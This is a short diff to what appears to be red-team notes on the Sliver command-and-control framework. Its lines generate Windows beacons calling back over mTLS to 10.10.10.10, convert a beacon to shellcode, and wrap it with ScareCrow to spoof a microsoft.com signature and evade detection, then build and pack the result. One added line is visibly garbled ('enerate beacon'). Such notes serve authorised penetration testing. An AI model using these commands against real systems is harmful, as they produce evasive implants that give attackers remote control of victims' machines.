@@ -109,7 +109,7 @@ download
 
 // With Administrative and adble to get SeDebugPrivilege - by default uses spool.svc to getsystem 
 getsystem
-
+enerate beacon --mtls 10.10.10.10:6969 --arch amd64 --os windows --save 
 // Shell
 Shell // Comes with an OPSec warning by default for good reason
 // Exit shell, be patient wait 30 seconds
@@ -157,7 +157,7 @@ Shellcode generation
 # Generate sliver beacon shellcode disabling shikata ga nai
 generate beacon --mtls  10.10.10.10:8443 --arch amd64 --os windows --save /tmp/8443-sliver.bin -f shellcode -G
 # use 
-/opt/ScareCrow/ScareCrow -I /tmp/8443-sliver.bin  -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
+/opt/ScareCrow/ScareCrow -I /tmp/8443-sliver.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
 # Build with golang
 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
 # Pack with upx
